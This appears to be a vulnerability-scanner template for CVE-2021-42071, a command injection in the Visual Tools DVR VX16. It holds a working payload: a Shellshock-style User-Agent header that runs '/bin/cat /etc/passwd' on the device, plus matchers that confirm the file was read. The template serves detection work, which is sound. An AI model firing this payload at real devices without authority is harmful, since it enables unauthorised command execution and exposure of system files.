id: CVE-2021-42071
info:
  name: Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection
  author: gy741
  severity: critical
  description: The vulnerability CVE-2021-42071 in Visual Tools DVR VX16 4.2.28.0
    allows hackers to inject unauthorized commands in affected devices without authentication.
  reference:
  - https://www.exploit-db.com/exploits/50098
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42071
  - https://visual-tools.com/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-42071
    cwe-id: CWE-78
  tags: edb,cve,cve2021,visualtools,rce,oast,injection
  metadata:
    impact: The impact of CVE-2021-42071 on Visual Tools DVR VX16 4.2.28.0 would allow
      an unauthorized attacker to execute operating system commands on the device,
      potentially resulting in unauthorized access and subsequent compromise of sensitive
      data.
    recommendation: It is highly recommended to update Visual Tools DVR VX16 4.2.28.0
      to fix CVE-2021-42071, an unauthenticated OS Command Injection vulnerability.
requests:
- raw:
  - 'GET /cgi-bin/slogin/login.py HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
